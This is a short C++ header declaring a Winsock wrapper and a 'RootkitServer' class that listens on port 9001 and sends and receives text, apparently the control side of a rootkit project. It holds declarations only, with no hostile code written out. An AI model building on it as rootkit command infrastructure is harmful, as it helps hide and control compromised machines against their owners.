#pragma once
#include "common.h"

namespace Server {
	constexpr unsigned short SERVER_PORT = 9001;
	constexpr unsigned int MAX_PACKET_SIZE = 1024;

	class WrapWSA {
	public:
		WrapWSA();
		void cleanup();
		int getError();
	};

	class RootkitServer {
	private:
		WrapWSA wsa_;
		unsigned short port_;
		SOCKET socket_;
		SOCKET client_socket_;
		bool init_listen_bind();
	public:
		RootkitServer();
		~RootkitServer();
		bool SendText(std::string& text);
		bool ReceiveText(std::string& text);
		bool Accept();
	};

}
